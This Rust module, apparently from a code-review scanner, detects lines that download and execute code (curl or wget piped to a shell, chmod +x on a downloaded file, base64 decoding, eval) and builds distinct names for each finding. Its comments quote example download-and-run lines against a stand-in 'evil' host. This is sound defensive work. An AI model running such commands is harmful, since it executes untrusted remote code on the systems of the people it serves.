//! What a line fetches, and what it does with it once it has.
//!
//! Split out of `content.rs` to stay under the file's line cap. Everything
//! here answers one question — which command on this line actually runs
//! what it downloaded, and how to name it — because a sentence that names
//! the wrong one gives two different payloads one identity, and one
//! dismissal then settles the one nobody saw.

use super::super::Line;

/// What this line does, and what it does it to — so two lines that reach
/// for two different things are two questions. A finding's identity is its
/// rule and its sentence, and a sentence that says only "this line" is the
/// same sentence wherever it fires: the person is shown one and settles
/// both.
///
/// Named from the line, never from the file it sits in: a file is something
/// kendex's own rendering moves between (an over-cap body is split into
/// `references/`), and an identity that moved with it would stop being the
/// finding a decision was made about.
pub(super) struct Reach {
    what: &'static str,
    /// How the operand attaches to `what` — "from", "with", "out of",
    /// "built from".
    preposition: &'static str,
    operand: String,
}

impl Reach {
    pub(super) fn said(&self) -> String {
        if self.operand.is_empty() {
            return self.what.to_owned();
        }
        const CAP: usize = 60;
        let shown = crate::quality::redact(&self.operand);
        // An `eval` argument is a whole program on one line, and a message
        // is a sentence. What is cut is named by a digest of the whole, so
        // two long operands sharing a prefix stay two questions.
        let shown = match shown.char_indices().nth(CAP) {
            None => shown,
            Some((at, _)) => format!("{}… {}", &shown[..at], crate::quality::digest(&shown)),
        };
        format!("{} {} `{shown}`", self.what, self.preposition)
    }
}

/// Interpreters a download can be handed straight to.
const SHELLS: &[&str] = &["sh", "bash", "zsh", "python"];

/// Whether this program reads what is piped into it and runs it.
///
/// A version on the end of the name is the same interpreter: `python3` is
/// what anybody actually writes, and it is the spelling a substring search
/// used to catch and a whole-word one stopped catching. Nothing else is
/// stretched — a name that is not one of these runs whatever it runs, and
/// saying otherwise would hold back lines nothing interprets.
fn interprets(program: &str) -> bool {
    SHELLS.contains(&program)
        || program.strip_prefix("python").is_some_and(|version| {
            !version.is_empty() && version.chars().all(|c| c.is_ascii_digit() || c == '.')
        })
}

/// The commands a line runs, read once with the shell's own quoting.
mod tokens;
use tokens::{Command, Reached};

/// A plain description of what this line fetches and runs, if it does.
pub(super) fn fetch_and_run(line: &Line) -> Option<Reach> {
    let commands = tokens::commands(&line.text);
    // Firing is about presence and naming is about structure: a line that
    // says `curl` anywhere fired this rule, and answering with silence
    // because nothing on it parses as a command would give every such line
    // one sentence.
    if line.has("curl") || line.has("wget") {
        let piped = runners(&commands, Reached::Pipe);
        let run = match piped.is_empty() {
            false => Some(("pipes a download straight into a shell", piped)),
            true => {
                let then = then_runs(&commands);
                (line.has("/tmp/") && !then.is_empty())
                    .then_some(("downloads a file and then executes it", then))
            }
        };
        if let Some((what, run)) = run {
            let (preposition, operand) = downloads(line, &commands, &run);
            return Some(Reach {
                what,
                preposition,
                operand,
            });
        }
    }
    if line.has("base64") && line.has("|") && (line.has("-d") || line.has("--decode")) {
        return Some(Reach {
            what: "decodes hidden text and pipes it onward",
            preposition: "out of",
            // Where an encoded payload is written, whether it is piped in
            // or passed on the decoding command itself.
            operand: match commands.first() {
                Some(first) => line.text[first.at.clone()].trim().to_owned(),
                None => line.text.trim().to_owned(),
            },
        });
    }
    line.find("eval(").map(|at| Reach {
        what: "hands a built-up string to an interpreter",
        preposition: "built from",
        // Everything after the parenthesis, not the text up to the first
        // `)`: an argument that calls something closes a bracket of its
        // own, so cutting there gives `eval(f(x) + a)` and `eval(f(x) + b)`
        // one sentence and one decision. Over-including never merges two
        // different programs; cutting early does.
        operand: line.text[at + "eval(".len()..].trim().to_owned(),
    })
}

/// Which commands on this line are an interpreter reached by `reached`.
fn runners(commands: &[Command], reached: Reached) -> Vec<usize> {
    commands
        .iter()
        .enumerate()
        .filter(|(_, command)| command.reached_by == reached)
        .filter(|(_, command)| command.verb().is_some_and(|verb| interprets(&verb)))
        .map(|(at, _)| at)
        .collect()
}

/// Which commands run a file that was downloaded first: a shell the line
/// goes on to, and making a downloaded file executable.
fn then_runs(commands: &[Command]) -> Vec<usize> {
    let mut found = runners(commands, Reached::And);
    found.extend(commands.iter().enumerate().filter_map(|(at, command)| {
        let marks = command.verb()? == "chmod" && command.has_word("+x");
        marks.then_some(at)
    }));
    found.sort_unstable();
    found.dedup();
    found
}

/// Which commands on this line are a fetch, by index.
///
/// The program being run, never the same letters somewhere inside an
/// argument: `curl` in `a.curl.se/x` is part of an address, and reading it
/// as the command names the tail of that address — which every host under
/// one domain shares.
fn fetches(commands: &[Command]) -> Vec<usize> {
    commands
        .iter()
        .enumerate()
        .filter(|(_, command)| {
            command
                .verb()
                .is_some_and(|verb| verb == "curl" || verb == "wget")
        })
        .map(|(at, _)| at)
        .collect()
}

/// What this line downloads and then runs, named.
///
/// For each place it runs something, the fetch that reaches that operator
/// is the last one written before it — not the first fetch on the line,
/// which on `curl https://safe/a; wget https://evil/x | sh` is the one that
/// never executes. Naming that one gives every line sharing its address one
/// sentence and one decision, whatever each of them actually runs.
///
/// A line whose fetches all come after everything it runs is still named by
/// what it fetches, and a line where nothing parses as a fetch command at
/// all is named by every address on it: the rule fired either way, and
/// saying nothing would be the same sentence for every such line.
fn downloads(line: &Line, commands: &[Command], run: &[usize]) -> (&'static str, String) {
    let written = fetches(commands);
    if written.is_empty() {
        return ("with", every_address(line));
    }
    let mut feeding: Vec<usize> = run
        .iter()
        .filter_map(|at| written.iter().rev().find(|before| *before < at).copied())
        .collect();
    feeding.dedup();
    if feeding.is_empty() {
        feeding = written;
    }
    let named: Vec<(&'static str, String)> = feeding
        .iter()
        .filter_map(|at| Some(fetched(commands.get(*at)?)))
        .collect();
    let preposition = match named.iter().all(|(said, _)| *said == "from") {
        true => "from",
        false => "with",
    };
    let targets: Vec<String> = named.into_iter().map(|(_, target)| target).collect();
    (preposition, targets.join(", "))
}

/// What a fetch verb is pointed at, and how to say it: the address it
/// names, or — where the address is not written out — its whole argument
/// list.
///
/// Both are read from this command's own arguments and never from the rest
/// of the line. `echo https://docs; curl https://evil/a | sh` downloads the
/// second address, and naming the first would give two lines running two
/// different payloads one sentence, and therefore one decision.
///
/// The address only when the arguments name exactly one, because which
/// token is the operand depends on the arity of every option before it.
/// `curl -o /tmp/payload "$URL"` hands `-o` a value, so the first token
/// that is not a switch is the output path; `curl --referer https://docs
/// https://evil/x` hands `--referer` an address, so the first address is
/// the one that is not downloaded. Neither can be told from the operand
/// without knowing every option curl and wget take, so where there is more
/// than one candidate the whole list is kept and none of them is called the
/// operand — which still makes two fetches that differ anywhere in it two
/// questions, and still shows the reader every address the line carries.
fn fetched(command: &Command) -> (&'static str, String) {
    let mut addresses: Vec<String> = command.arguments().iter().filter_map(address_in).collect();
    if addresses.len() == 1 {
        return ("from", addresses.remove(0));
    }
    let spelled: Vec<&str> = command
        .arguments()
        .iter()
        .map(|word| word.text.as_str())
        .collect();
    ("with", spelled.join(" "))
}

/// The address one word carries, if it carries one.
///
/// From the scheme to the end of the word, because the word is what the
/// shell hands the command: a separator inside it was quoted, and cutting
/// there would give `'https://host/p;v=1'` and `'https://host/p;v=2'` one
/// address, one sentence and one decision.
///
/// A bare word loses the punctuation the sentence around it put there — a
/// line of documentation writes an address inside brackets or ends one with
/// a full stop, and neither is part of the address. A quoted word loses
/// nothing: there is no prose inside quotes, only an operand, and
/// `'…/p,v1,'` and `'…/p,v1.'` are two different requests to the same host.
fn address_in(word: &tokens::Word) -> Option<String> {
    const PROSE: &[char] = &[')', '(', '<', '>', ',', '.', ';', ':', '!', '?'];
    let lower = word.text.to_ascii_lowercase();
    let at = ["https://", "http://"]
        .iter()
        .filter_map(|scheme| lower.find(scheme))
        .min()?;
    let url = &word.text[at..];
    let url = match word.quoted {
        true => url,
        false => url.trim_end_matches(PROSE),
    };
    (url.len() > "http://".len()).then(|| url.to_owned())
}

/// Every address the line carries, for a line that fired this rule without
/// anything on it parsing as a fetch command.
fn every_address(line: &Line) -> String {
    let found: Vec<String> = tokens::commands(&line.text)
        .iter()
        .flat_map(|command| command.words.iter())
        .filter_map(address_in)
        .collect();
    match found.is_empty() {
        true => line
            .text
            .split_whitespace()
            .collect::<Vec<&str>>()
            .join(" "),
        false => found.join(", "),
    }
}
